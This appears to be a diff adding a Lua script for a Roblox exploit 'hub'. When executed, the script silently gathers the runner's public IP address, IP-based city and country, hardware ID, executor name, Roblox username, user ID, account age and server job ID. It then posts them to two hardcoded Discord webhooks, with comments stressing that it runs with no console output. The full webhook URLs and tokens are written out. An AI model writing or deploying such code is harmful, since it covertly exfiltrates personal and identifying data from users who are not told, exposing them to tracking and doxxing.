@@ -1,1 +1,241 @@
+-- Chasesdd Hub Webhook Logger
+-- Compact version with device detection and location
+-- MODIFIED: Now sends to two webhooks
 
+local WEBHOOK_URLS = {
+    "https://discord.com/api/webhooks/1410121555127566399/NZpdL5BpYUH6ZkKzO0cKAmw7b_kTiUzBFIwiGrQf6nus7j_nXRimaTENVBl8DoS1LYTY",
+    "https://discord.com/api/webhooks/1416984327849377853/tNk_iJ8TiW2y90gWk0WOoGG6swPdzkQSqR8d2R6z_s7a2cLuBnwBHovX5rHoLQAmSYly"
+}
+
+-- Function to get client IP address
+local function getClientIP()
+    local ip = "Unknown"
+    local success, result = pcall(function()
+        if getip then return getip() end
+        local response = game:HttpGet("http://httpbin.org/ip", true)
+        local data = game:GetService("HttpService"):JSONDecode(response)
+        return data.origin
+    end)
+    if success and result then ip = result end
+    return ip
+end
+
+-- Function to get location from IP
+local function getLocationFromIP(ip)
+    if ip == "Unknown" then return "Unknown" end
+    
+    local location = "Unknown"
+    local success, result = pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json/" .. ip, true)
+        local data = game:GetService("HttpService"):JSONDecode(response)
+        if data and data.country and data.city then
+            return data.country .. " • " .. data.city
+        end
+        return "Unknown"
+    end)
+    if success and result then location = result end
+    return location
+end
+
+-- Function to detect device type
+local function getDeviceType()
+    local device = "PC" -- Default to PC
+    
+    local success, result = pcall(function()
+        -- Check if mobile device
+        if game:GetService("UserInputService").TouchEnabled then
+            -- Check screen size to differentiate between phone and tablet
+            local screenSize = workspace.CurrentCamera.ViewportSize
+            if math.min(screenSize.X, screenSize.Y) < 1000 then
+                return "Phone"
+            else
+                return "Tablet"
+            end
+        end
+        return "PC"
+    end)
+    
+    if success and result then device = result end
+    return device
+end
+
+-- Function to get Executor Name
+local function getExecutorName()
+    local executor = "Unknown"
+    local success, result = pcall(function()
+        if identifyexecutor then return identifyexecutor() end
+        if getexecutorname then return getexecutorname() end
+        return "Unknown"
+    end)
+    if success and result then executor = result end
+    return executor
+end
+
+-- Function to get HWID
+local function getHWID()
+    local hwid = "Unknown"
+    local success, result = pcall(function()
+        if get_hwid then return get_hwid() end
+        return "Unknown"
+    end)
+    if success and result then hwid = result end
+    return hwid
+end
+
+-- Function to get player information
+local function getPlayerInfo()
+    local players = game:GetService("Players")
+    local localPlayer = players.LocalPlayer
+    
+    local playerInfo = {
+        username = "Unknown",
+        userId = "Unknown",
+        accountAge = "Unknown"
+    }
+    
+    if localPlayer then
+        playerInfo.username = localPlayer.Name or "Unknown"
+        playerInfo.userId = tostring(localPlayer.UserId) or "Unknown"
+        
+        pcall(function()
+            playerInfo.accountAge = tostring(localPlayer.AccountAge) .. " days"
+        end)
+    end
+    
+    return playerInfo
+end
+
+-- Function to get player count
+local function getPlayerCount()
+    local players = game:GetService("Players")
+    return tostring(#players:GetPlayers()) .. "/" .. tostring(players.MaxPlayers)
+end
+
+-- Function to get game info
+local function getGameInfo()
+    local marketplace = game:GetService("MarketplaceService")
+    local gameName = "Unknown"
+    
+    pcall(function()
+        local info = marketplace:GetProductInfo(game.PlaceId)
+        gameName = info.Name or "Unknown"
+    end)
+    
+    return gameName
+end
+
+-- Robust HTTP sender function (MODIFIED: Sends to all webhooks in the table)
+local function sendWebhook(data)
+    local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
+    
+    -- Loop through each webhook URL in the table
+    for _, webhookUrl in ipairs(WEBHOOK_URLS) do
+        if not req then 
+            local http = game:GetService("HttpService")
+            local success, result = pcall(function() return http:PostAsync(webhookUrl, data) end)
+            -- Optionally, you could log if each one failed here
+        else
+            local ok, res = pcall(req, {
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { 
+                    ["Content-Type"] = "application/json",
+                    ["User-Agent"] = "Chasesdd-Hub-Webhook/2.0"
+                },
+                Body = data,
+            })
+            -- Optionally, you could log the status of each send here
+            -- if not ok then print("Webhook Error for URL: " .. tostring(res)) end
+        end
+    end
+    return true, "Sent to all webhooks" -- Simplified return since we're sending to multiple
+end
+
+-- Function to create compact embed
+local function createEmbed()
+    local playerInfo = getPlayerInfo()
+    local gameName = getGameInfo()
+    local ip = getClientIP()
+    local location = getLocationFromIP(ip)
+    local deviceType = getDeviceType()
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S PST")
+    local timeShort = os.date("%I:%M %p")
+    
+    return {
+        username = "Chasesdd Hub Logs APP",
+        embeds = {
+            {
+                title = "Chasesdd Hub Executed",
+                color = 5814783,
+                fields = {
+                    {
+                        name = "👤 User",
+                        value = "```" .. playerInfo.username .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "📅 Account Age",
+                        value = "```" .. playerInfo.accountAge .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "📱 Device",
+                        value = "```" .. deviceType .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "⚙️ Executor",
+                        value = "```" .. getExecutorName() .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "🔑 HWID",
+                        value = "||```" .. getHWID() .. "```||",
+                        inline = false
+                    },
+                    {
+                        name = "🌐 IP Address",
+                        value = "||```" .. ip .. "```||",
+                        inline = false
+                    },
+                    {
+                        name = "📍 Location",
+                        value = "```" .. location .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "👥 Players",
+                        value = "```" .. getPlayerCount() .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "🎮 Game",
+                        value = "```" .. gameName .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "🔧 Job ID",
+                        value = "||```" .. (game.JobId or "Unknown") .. "```||",
+                        inline = true
+                    }
+                },
+                footer = {
+                    text = "Chasesdd Hub Security Logger • " .. os.date("Today at %I:%M %p")
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    }
+end
+
+-- Main execution (silent - no console output)
+local function main()
+    local embed = createEmbed()
+    local jsonData = game:GetService("HttpService"):JSONEncode(embed)
+    
+    local success, result = sendWebhook(jsonData)
+    -- No console output - completely silent operation
+end
+
+-- Run the script silently
+main()
